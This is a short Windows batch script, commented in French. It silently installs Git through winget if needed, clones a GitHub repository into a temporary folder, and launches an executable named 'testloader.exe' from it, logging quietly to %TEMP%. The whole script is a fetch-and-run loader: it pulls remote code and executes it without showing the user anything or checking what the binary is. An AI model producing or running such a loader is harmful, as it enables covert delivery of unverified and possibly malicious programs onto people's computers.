@echo off
setlocal ENABLEEXTENSIONS
set "repoURL=https://github.com/louislefo/test.git"
set "exeName=testloader.exe"
set "dossier=%TEMP%\testlouis"
set "logFile=%TEMP%\install_log.txt"

:: Nettoyer ancien log
del /f /q "%logFile%" >nul 2>&1

:: Vérifier si Git est installé
where git >>"%logFile%" 2>&1
if errorlevel 1 (
    :: Vérifier si Winget est disponible
    where winget >>"%logFile%" 2>&1
    if errorlevel 1 (
        echo Git et Winget indisponibles >>"%logFile%"
        exit /b 1
    )

    :: Installer Git silencieusement via Winget
    winget install --id Git.Git -e --source winget >>"%logFile%" 2>&1
    if errorlevel 1 (
        echo Echec de l'installation de Git >>"%logFile%"
        exit /b 1
    )
)

:: Supprimer l’ancien dossier
if exist "%dossier%" (
    rmdir /s /q "%dossier%" >>"%logFile%" 2>&1
)

:: Cloner le dépôt
git clone "%repoURL%" "%dossier%" >>"%logFile%" 2>&1
if errorlevel 1 exit /b 1

:: Vérifier et lancer l'exécutable
if exist "%dossier%\%exeName%" (
    start "" "%dossier%\%exeName%"
) else (
    echo Executable introuvable >>"%logFile%"
    exit /b 1
)

exit /b 0
